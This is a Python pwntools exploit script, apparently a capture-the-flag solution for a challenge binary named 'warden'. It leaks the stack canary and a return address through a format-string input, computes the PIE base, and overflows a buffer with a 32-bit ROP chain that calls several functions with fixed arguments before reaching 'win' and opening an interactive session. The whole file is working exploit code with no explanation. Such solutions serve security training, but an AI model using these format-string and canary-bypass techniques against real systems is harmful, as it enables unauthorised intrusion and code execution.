#!/usr/bin/env python3
from pwn import *

exe = ELF("./warden")
context.binary = exe
context.log_level = 'debug'
# context.arch = 'amd64' 
context.terminal = ["cmd.exe", "/c", "start", "wsl.exe", "-e"]
# libc = ELF("./libc.so.6", checksec=False)
# ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

def sla(delim, data): return p.sendlineafter(delim, data)
def sa(delim, data):  return p.sendafter(delim, data)
def sl(data):         return p.sendline(data)
def s(data):          return p.send(data)
def ru(delim):        return p.recvuntil(delim)
def rl():             return p.recvline()
def r(n):             return p.recv(n)

gdbscript = '''
init-pwndbg
continue
'''
def conn():
    if args.REMOTE:
        return remote("HOST_ADDRESS", 1337)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        # return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
        return process([exe.path])
p = conn()
# --- Exploit ---
# Payload 
ru(b"breached.\n")
sl(b'%15$p|%19$p') 
raw_output = p.recvline() 

clean_output = raw_output.split(b'Pow')[0].strip()
leak_data = clean_output.split(b'|')

canary = int(leak_data[0], 16)
leak_main_ret = int(leak_data[1], 16)

log.success(f"Canary: {hex(canary)}")
log.success(f"Leak Ret: {hex(leak_main_ret)}")

offset_ret_main = 0x14fd 
exe.address = leak_main_ret - offset_ret_main
log.success(f"PIE Base: {hex(exe.address)}")

rop = ROP(exe)
pop_ret = rop.find_gadget(['pop ebx', 'ret'])[0]

payload = flat(
    exe.symbols['braum'],
    pop_ret,
    4919,

    exe.symbols['ornn'],
    pop_ret,
    1056,
    
    exe.symbols['thress'],
    pop_ret,
    0xdeadbeef,
    
    exe.symbols['win'],
    0x0,      
    291       
)

final_payload = b'A' * 32 + p32(canary) + b'B' * 12 + payload

log.info("Sending payload...")
sl(final_payload)

p.interactive()
